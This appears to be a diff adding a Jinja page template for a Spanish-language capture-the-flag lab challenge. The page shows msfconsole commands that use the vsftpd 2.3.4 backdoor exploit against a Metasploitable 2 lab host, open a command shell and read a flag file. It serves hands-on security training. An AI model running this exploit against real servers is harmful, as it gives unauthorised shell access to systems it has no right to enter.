@@ -1,0 +1,34 @@
+{% extends 'base.html' %}
+{% from '_macros.html' import challenge_header, briefing, hints, flag_form, detect_bar, nav_buttons %}
+{% block title %}Mamá Osa Despierta — Goldilocks CTF{% endblock %}
+
+{% block content %}
+<div class="wrap narrow">
+  {{ challenge_header(ch) }}
+  <p class="lead">"Mamá Osa se levanta… El viejo servicio del sótano tiene una puerta trasera conocida."</p>
+
+  {{ detect_bar(g_detection) }}
+  {{ briefing(ch) }}
+
+  <div class="card glow-red">
+    <div class="card-title">🎯 msfconsole (laboratorio)</div>
+    <p style="font-size:0.9rem;color:var(--text-dim);">
+      Contra el host <code>Metasploitable 2</code> (<code>192.168.56.13</code>):
+    </p>
+    <div class="code-block">msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > set RHOSTS 192.168.56.13
+msf6 > run
+
+[*] Command shell session 1 opened
+$ cat /home/msfadmin/mama_osa.flag</div>
+    <p style="font-size:0.85rem;color:var(--text-faint);">
+      La bandera está en el sistema comprometido tras abrir la sesión.
+    </p>
+  </div>
+
+  {{ hints(ch, hint_cost_min, hint_cost_pts) }}
+  {{ flag_form(ch, g_solved) }}
+
+  {{ nav_buttons(ch) }}
+</div>
+{% endblock %}
